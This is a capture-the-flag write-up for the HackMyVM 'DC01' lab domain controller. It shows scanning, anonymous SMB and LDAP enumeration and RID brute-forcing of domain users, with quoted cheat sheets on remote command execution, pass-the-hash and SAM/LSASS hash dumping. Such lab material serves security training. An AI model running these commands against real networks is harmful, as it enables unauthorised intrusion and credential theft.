# CTF Penetration Testing

## HackMyVM

### DC01 - Machine

#### Machine Description

- Machine name: [DC01](https://hackmyvm.eu/machines/machine.php?vm=DC01)
- Machine type: Windows VM <img src="https://hackmyvm.eu/img/windows.png" alt="Windows" width="20"/>
- Machine difficulty: 🟩 Easy

<img src="https://hackmyvm.eu/img/vm/dc01.png" alt="DC01 Machine Logo" width="150"/>

#### Tools Used

- CrackMapExec
- Evil-WinRM
- impacket-GetNPUsers
- impacket-lookupsid
- impacket-reg
- impacket-secretsdump
- impacket-smbserver
- Kerbrute
- LDAPDomainDump
- ldapsearch
- Nmap
- smbclient

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig`:
```
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:f5:0e:5c:12  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        ether 08:00:27:1e:36:4a  txqueuelen 1000  (Ethernet)
        RX packets 6  bytes 3010 (2.9 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 18  bytes 3331 (3.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.102  netmask 255.255.255.0  broadcast 192.168.56.255 ←
        inet6 fe80::b8a4:ba37:17c5:3d73  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:6e:4c:1d  txqueuelen 1000  (Ethernet)
        RX packets 5  bytes 2420 (2.3 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 30  bytes 4688 (4.5 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 480 (480.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 480 (480.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping -a -g 192.168.56.0/24 2> /dev/null`:
```
192.168.56.100
192.168.56.102
192.168.56.128 ←
```

`nmap -Pn -sS -sV -p- -T4 192.168.56.128`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-02 07:00 EDT
Nmap scan report for 192.168.56.128
Host is up (0.0023s latency).
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-02 20:02:49Z)
135/tcp   open  msrpc         Microsoft Windows RPC ←
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn ←
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name) ←
445/tcp   open  microsoft-ds? ←
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) ←
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49683/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:3D:0B:72 (Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows ←

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 191.78 seconds
```

`nmap -Pn -sS --script=smb-protocols -p445 192.168.56.128`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-02 07:03 EDT
Nmap scan report for 192.168.56.128
Host is up (0.0014s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 08:00:27:3D:0B:72 (Oracle VirtualBox virtual NIC)

Host script results:
| smb-protocols: ←
|   dialects:
|     2:0:2
|     2:1:0
|     3:0:0
|     3:0:2
|_    3:1:1

Nmap done: 1 IP address (1 host up) scanned in 0.53 seconds
```

`nmap -Pn -sS --script=smb2-security-mode -p445 192.168.56.128`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-02 07:04 EDT
Nmap scan report for 192.168.56.128
Host is up (0.0045s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 08:00:27:3D:0B:72 (Oracle VirtualBox virtual NIC)

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required ←

Nmap done: 1 IP address (1 host up) scanned in 0.58 seconds
```

<🔄 Alternative Step>

`crackmapexec smb 192.168.56.128`:
```
SMB         192.168.56.128  445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) ←
```

</🔄 Alternative Step>

`echo -e '192.168.56.128\tDC01.SOUPEDECODE.LOCAL' | sudo tee -a /etc/hosts`:
```
192.168.56.128  DC01.SOUPEDECODE.LOCAL ←
```

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[139,445 - Pentesting SMB](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb)

[**#Possible Credentials**]

|   |   |
|---|---|
|**Username(s)**|**Common passwords**|
|_(blank)_|_(blank)_|
|guest|_(blank)_|
|Administrator, admin|_(blank)_, password, administrator, admin|
|arcserve|arcserve, backup|
|tivoli, tmersrvd|tivoli, tmersrvd, admin|
|backupexec, backup|backupexec, backup, arcada|
|test, lab, demo|password, test, lab, demo|

[**#Obtain Information**]

```bash
#Dump interesting information
enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
enum4linux-ng -A [-u "<username>" -p "<passwd>"] <IP>
nmap --script "safe or smb-enum-*" -p 445 <IP>

#Connect to the rpc
rpcclient -U "" -N <IP> #No creds
rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
rpcclient -U "username%passwd" <IP> #With creds
#You can use querydispinfo and enumdomusers to query user information

#Dump user information
/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]<targetName or address>

#Map possible RPC endpoints
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password
```

[**#List shared folders**]

It is always recommended to look if you can access to anything, if you don't have credentials try using **null** **credentials/guest user**.
```bash
smbclient --no-pass -L //<IP> # Null user
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash

smbmap -H <IP> [-P <PORT>] #Null user
smbmap -u "username" -p "password" -H <IP> [-P <PORT>] #Creds
smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] #Pass-the-Hash
smbmap -R -u "username" -p "password" -H <IP> [-P <PORT>] #Recursive list

crackmapexec smb <IP> -u '' -p '' --shares #Null user
crackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user
crackmapexec smb <IP> -u 'username' -H '<HASH>' --shares #Guest user
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`smbclient --no-pass -L 192.168.56.128`:
```
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.56.128 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

<🔄 Alternative Step>

`crackmapexec smb 192.168.56.128 -u 'anonymous' -p '' --shares`:
```
SMB         192.168.56.128  445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.56.128  445    DC01             [+] SOUPEDECODE.LOCAL\anonymous: 
SMB         192.168.56.128  445    DC01             [*] Enumerated shares
SMB         192.168.56.128  445    DC01             Share           Permissions     Remark
SMB         192.168.56.128  445    DC01             -----           -----------     ------
SMB         192.168.56.128  445    DC01             ADMIN$                          Remote Admin                                                                                          
SMB         192.168.56.128  445    DC01             backup                          
SMB         192.168.56.128  445    DC01             C$                              Default share                                                                                         
SMB         192.168.56.128  445    DC01             IPC$            READ            Remote IPC                                                                                            
SMB         192.168.56.128  445    DC01             NETLOGON                        Logon server share                                                                                    
SMB         192.168.56.128  445    DC01             SYSVOL                          Logon server share                                                                                    
SMB         192.168.56.128  445    DC01             Users
```

</🔄 Alternative Step>

`nmap -Pn -sS --script=ldap-rootdse -p389 192.168.56.128`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-02 09:25 EDT
Nmap scan report for 192.168.56.128
Host is up (0.00050s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7 ←
|       forestFunctionality: 7 ←
|       domainControllerFunctionality: 7 ←
|       rootDomainNamingContext: DC=SOUPEDECODE,DC=LOCAL ←
|       ldapServiceName: SOUPEDECODE.LOCAL:dc01$@SOUPEDECODE.LOCAL
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedControl: 1.2.840.113556.1.4.2330
|       supportedControl: 1.2.840.113556.1.4.2354
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL ←
|       serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL ←
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
|       namingContexts: DC=SOUPEDECODE,DC=LOCAL
|       namingContexts: CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
|       namingContexts: CN=Schema,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
|       namingContexts: DC=DomainDnsZones,DC=SOUPEDECODE,DC=LOCAL
|       namingContexts: DC=ForestDnsZones,DC=SOUPEDECODE,DC=LOCAL
|       isSynchronized: TRUE
|       highestCommittedUSN: 180251
|       dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
|       dnsHostName: DC01.SOUPEDECODE.LOCAL ←
|       defaultNamingContext: DC=SOUPEDECODE,DC=LOCAL
|       currentTime: 20240902222531.0Z
|_      configurationNamingContext: CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
MAC Address: 08:00:27:3D:0B:72 (Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows

Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
```

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[389, 636, 3268, 3269 - Pentesting LDAP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap)

[**#Bypass TLS SNI check**]

According to [**this writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) just by accessing the LDAP server with an arbitrary domain name (like company.com) he was able to contact the LDAP service and extract information as an anonymous user:
```
ldapsearch -H ldaps://company.com:636/ -x -s base -b '' "(objectClass=*)" "*" +
```

[**#LDAP anonymous binds**]

[LDAP anonymous binds](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled) allow **unauthenticated attackers** to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. This is a **legacy configuration**, and as of Windows Server 2003, only authenticated users are permitted to initiate LDAP requests. However, admins may have needed to **set up a particular application to allow anonymous binds** and given out more than the intended amount of access, thereby giving unauthenticated users access to all objects in AD.

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[139,445 - Pentesting SMB](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb)

[**#Enumerate Users, Groups & Logged On Users**]

This info should already being gathered from enum4linux and enum4linux-ng
```bash
crackmapexec smb 10.10.10.10 --users [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups --loggedon-users [-u <username> -p <password>]

ldapsearch -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "(&(objectclass=user))" -h 10.10.10.10 | grep -i samaccountname: | cut -f 2 -d " "

rpcclient -U "" -N 10.10.10.10
enumdomusers
enumdomgroups
```

[**#Execute Commands**]

crackmapexec can execute commands **abusing** any of **mmcexec, smbexec, atexec, wmiexec** being **wmiexec** the **default** method. You can indicate which option you prefer to use with the parameter `--exec-method`:
```bash
apt-get install crackmapexec

crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Execute Powershell
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd
crackmapexec smb 192.168.10.11 -u Administrator -H <NTHASH> -x whoami #Pass-the-Hash
# Using --exec-method {mmcexec,smbexec,atexec,wmiexec}

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam #Dump SAM
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sessions #Get sessions (
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --loggedon-users #Get logged-on users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --disks #Enumerate the disks
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --users #Enumerate users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --groups # Enumerate groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --local-groups # Enumerate local groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --pass-pol #Get password policy
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --rid-brute #RID brute

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -H <HASH> #Pass-The-Hash
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

<🔄 Alternative Step>

`ldapsearch -x -H ldap://192.168.56.128/ -s base -b '' "(objectClass=*)" "*" +`:
```
# extended LDIF
#
# LDAPv3
# base <> with scope baseObject ←
# filter: (objectClass=*) ←
# requesting: * + ←
#

#
dn:
domainFunctionality: 7 ←
forestFunctionality: 7 ←
domainControllerFunctionality: 7 ←
rootDomainNamingContext: DC=SOUPEDECODE,DC=LOCAL ←
ldapServiceName: SOUPEDECODE.LOCAL:dc01$@SOUPEDECODE.LOCAL ←
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
supportedLDAPVersion: 3
supportedLDAPVersion: 2
supportedLDAPPolicies: MaxPoolThreads
supportedLDAPPolicies: MaxPercentDirSyncRequests
supportedLDAPPolicies: MaxDatagramRecv
supportedLDAPPolicies: MaxReceiveBuffer
supportedLDAPPolicies: InitRecvTimeout
supportedLDAPPolicies: MaxConnections
supportedLDAPPolicies: MaxConnIdleTime
supportedLDAPPolicies: MaxPageSize
supportedLDAPPolicies: MaxBatchReturnMessages
supportedLDAPPolicies: MaxQueryDuration
supportedLDAPPolicies: MaxDirSyncDuration
supportedLDAPPolicies: MaxTempTableSize
supportedLDAPPolicies: MaxResultSetSize
supportedLDAPPolicies: MinResultSets
supportedLDAPPolicies: MaxResultSetsPerConn
supportedLDAPPolicies: MaxNotificationPerConn
supportedLDAPPolicies: MaxValRange
supportedLDAPPolicies: MaxValRangeTransitive
supportedLDAPPolicies: ThreadMemoryLimit
supportedLDAPPolicies: SystemMemoryLimitPercent
supportedControl: 1.2.840.113556.1.4.319
supportedControl: 1.2.840.113556.1.4.801
supportedControl: 1.2.840.113556.1.4.473
supportedControl: 1.2.840.113556.1.4.528
supportedControl: 1.2.840.113556.1.4.417
supportedControl: 1.2.840.113556.1.4.619
supportedControl: 1.2.840.113556.1.4.841
supportedControl: 1.2.840.113556.1.4.529
supportedControl: 1.2.840.113556.1.4.805
supportedControl: 1.2.840.113556.1.4.521
supportedControl: 1.2.840.113556.1.4.970
supportedControl: 1.2.840.113556.1.4.1338
supportedControl: 1.2.840.113556.1.4.474
supportedControl: 1.2.840.113556.1.4.1339
supportedControl: 1.2.840.113556.1.4.1340
supportedControl: 1.2.840.113556.1.4.1413
supportedControl: 2.16.840.1.113730.3.4.9
supportedControl: 2.16.840.1.113730.3.4.10
supportedControl: 1.2.840.113556.1.4.1504
supportedControl: 1.2.840.113556.1.4.1852
supportedControl: 1.2.840.113556.1.4.802
supportedControl: 1.2.840.113556.1.4.1907
supportedControl: 1.2.840.113556.1.4.1948
supportedControl: 1.2.840.113556.1.4.1974
supportedControl: 1.2.840.113556.1.4.1341
supportedControl: 1.2.840.113556.1.4.2026
supportedControl: 1.2.840.113556.1.4.2064
supportedControl: 1.2.840.113556.1.4.2065
supportedControl: 1.2.840.113556.1.4.2066
supportedControl: 1.2.840.113556.1.4.2090
supportedControl: 1.2.840.113556.1.4.2205
supportedControl: 1.2.840.113556.1.4.2204
supportedControl: 1.2.840.113556.1.4.2206
supportedControl: 1.2.840.113556.1.4.2211
supportedControl: 1.2.840.113556.1.4.2239
supportedControl: 1.2.840.113556.1.4.2255
supportedControl: 1.2.840.113556.1.4.2256
supportedControl: 1.2.840.113556.1.4.2309
supportedControl: 1.2.840.113556.1.4.2330
supportedControl: 1.2.840.113556.1.4.2354
supportedCapabilities: 1.2.840.113556.1.4.800
supportedCapabilities: 1.2.840.113556.1.4.1670
supportedCapabilities: 1.2.840.113556.1.4.1791
supportedCapabilities: 1.2.840.113556.1.4.1935
supportedCapabilities: 1.2.840.113556.1.4.2080
supportedCapabilities: 1.2.840.113556.1.4.2237
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=SOUPEDECODE,DC=L
 OCAL
serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configur
 ation,DC=SOUPEDECODE,DC=LOCAL ←
schemaNamingContext: CN=Schema,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
namingContexts: DC=SOUPEDECODE,DC=LOCAL
namingContexts: CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
namingContexts: CN=Schema,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
namingContexts: DC=DomainDnsZones,DC=SOUPEDECODE,DC=LOCAL
namingContexts: DC=ForestDnsZones,DC=SOUPEDECODE,DC=LOCAL
isSynchronized: TRUE
highestCommittedUSN: 176156
dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,
 CN=Sites,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
dnsHostName: DC01.SOUPEDECODE.LOCAL ←
defaultNamingContext: DC=SOUPEDECODE,DC=LOCAL
currentTime: 20240902214246.0Z
configurationNamingContext: CN=Configuration,DC=SOUPEDECODE,DC=LOCAL

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

</🔄 Alternative Step>

`crackmapexec smb 192.168.56.128 -d 'SOUPEDECODE.LOCAL' -u 'anonymous' -p '' --rid-brute`:
```
SMB         192.168.56.128  445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.56.128  445    DC01             [+] SOUPEDECODE.LOCAL\anonymous: 
SMB         192.168.56.128  445    DC01             498: SOUPEDECODE\Enterprise Read-only Domain Controllers (SidTypeGroup)                                                               
SMB         192.168.56.128  445    DC01             500: SOUPEDECODE\Administrator (SidTypeUser)                                                                                          
SMB         192.168.56.128  445    DC01             501: SOUPEDECODE\Guest (SidTypeUser)
SMB         192.168.56.128  445    DC01             502: SOUPEDECODE\krbtgt (SidTypeUser)
SMB         192.168.56.128  445    DC01             512: SOUPEDECODE\Domain Admins (SidTypeGroup)                                                                                         
SMB         192.168.56.128  445    DC01             513: SOUPEDECODE\Domain Users (SidTypeGroup)                                                                                          
SMB         192.168.56.128  445    DC01             514: SOUPEDECODE\Domain Guests (SidTypeGroup)                                                                                         
SMB         192.168.56.128  445    DC01             515: SOUPEDECODE\Domain Computers (SidTypeGroup)                                                                                      
SMB         192.168.56.128  445    DC01             516: SOUPEDECODE\Domain Controllers (SidTypeGroup)                                                                                    
SMB         192.168.56.128  445    DC01             517: SOUPEDECODE\Cert Publishers (SidTypeAlias)                                                                                       
SMB         192.168.56.128  445    DC01             518: SOUPEDECODE\Schema Admins (SidTypeGroup)                                                                                         
SMB         192.168.56.128  445    DC01             519: SOUPEDECODE\Enterprise Admins (SidTypeGroup)                                                                                     
SMB         192.168.56.128  445    DC01             520: SOUPEDECODE\Group Policy Creator Owners (SidTypeGroup)                                                                           
SMB         192.168.56.128  445    DC01             521: SOUPEDECODE\Read-only Domain Controllers (SidTypeGroup)                                                                          
SMB         192.168.56.128  445    DC01             522: SOUPEDECODE\Cloneable Domain Controllers (SidTypeGroup)                                                                          
SMB         192.168.56.128  445    DC01             525: SOUPEDECODE\Protected Users (SidTypeGroup)                                                                                       
SMB         192.168.56.128  445    DC01             526: SOUPEDECODE\Key Admins (SidTypeGroup)                                                                                            
SMB         192.168.56.128  445    DC01             527: SOUPEDECODE\Enterprise Key Admins (SidTypeGroup)                                                                                 
SMB         192.168.56.128  445    DC01             553: SOUPEDECODE\RAS and IAS Servers (SidTypeAlias)                                                                                   
SMB         192.168.56.128  445    DC01             571: SOUPEDECODE\Allowed RODC Password Replication Group (SidTypeAlias)                                                               
SMB         192.168.56.128  445    DC01             572: SOUPEDECODE\Denied RODC Password Replication Group (SidTypeAlias)                                                                
SMB         192.168.56.128  445    DC01             1000: SOUPEDECODE\DC01$ (SidTypeUser)
SMB         192.168.56.128  445    DC01             1101: SOUPEDECODE\DnsAdmins (SidTypeAlias)                                                                                            
SMB         192.168.56.128  445    DC01             1102: SOUPEDECODE\DnsUpdateProxy (SidTypeGroup)                                                                                       
SMB         192.168.56.128  445    DC01             1103: SOUPEDECODE\bmark0 (SidTypeUser)
SMB         192.168.56.128  445    DC01             1104: SOUPEDECODE\otara1 (SidTypeUser)
SMB         192.168.56.128  445    DC01             1105: SOUPEDECODE\kleo2 (SidTypeUser)
SMB         192.168.56.128  445    DC01             1106: SOUPEDECODE\eyara3 (SidTypeUser)
SMB         192.168.56.128  445    DC01             1107: SOUPEDECODE\pquinn4 (SidTypeUser)
SMB         192.168.56.128  445    DC01             1108: SOUPEDECODE\jharper5 (SidTypeUser)
SMB         192.168.56.128  445    DC01             1109: SOUPEDECODE\bxenia6 (SidTypeUser)
SMB         192.168.56.128  445    DC01             1110: SOUPEDECODE\gmona7 (SidTypeUser)
SMB         192.168.56.128  445    DC01             1111: SOUPEDECODE\oaaron8 (SidTypeUser)
SMB         192.168.56.128  445    DC01             1112: SOUPEDECODE\pleo9 (SidTypeUser)
SMB         192.168.56.128  445    DC01             1113: SOUPEDECODE\evictor10 (SidTypeUser)
SMB         192.168.56.128  445    DC01             1114: SOUPEDECODE\wreed11 (SidTypeUser)
SMB         192.168.56.128  445    DC01             1115: SOUPEDECODE\bgavin12 (SidTypeUser)
SMB         192.168.56.128  445    DC01             1116: SOUPEDECODE\ndelia13 (SidTypeUser)
SMB         192.168.56.128  445    DC01             1117: SOUPEDECODE\akevin14 (SidTypeUser)
SMB         192.168.56.128  445    DC01             1118: SOUPEDECODE\kxenia15 (SidTypeUser)

[...]
```

<div>
	<img src="./assets/logo_exploit-notes.png" alt="Exploit Notes Logo" width="16" height="auto">
	<span style="#963bc2: white; font-size: 110%;"><strong>Exploit Notes</strong></span>
</div>

[SMB (Server Message Block) Pentesting](https://exploit-notes.hdks.org/exploit/windows/active-directory/smb-pentesting/)

[**#RID Cycling Attack**]

RID enumeration.  
It attempts to enumerate user accounts through null sessions.
```sh
# Anonymous logon
# 20000: Maximum RID to be cycled
impacket-lookupsid example.local/anonymous@<target-ip> 20000 -no-pass
impacket-lookupsid example.local/guest@<target-ip> 20000 -no-pass
impacket-lookupsid example.local/guest@<target-ip> 20000
# Specify user
impacket-lookupsid example.local/user@<target-ip> 20000 -hashes <lmhash>:<nthash>
impacket-lookupsid example.local/user@<target-ip> 20000


# USEFUL COMMAND
# This command extract usernames. It's useful for further enumeration which uses usernames.
# Replace the following keywords:
#  - `example.com` => Target domain
#  - `10.0.0.1`    => Target IP
#  - `DOMAIN`      => Target domain name
impacket-lookupsid example.com/guest@10.0.0.1 20000 -no-pass > tmp.txt | cat tmp.txt | grep SidTypeUser | cut -d ' ' -f 2 | sed 's/DOMAIN\\//g' | sort -u > users.txt && rm tmp.txt
```

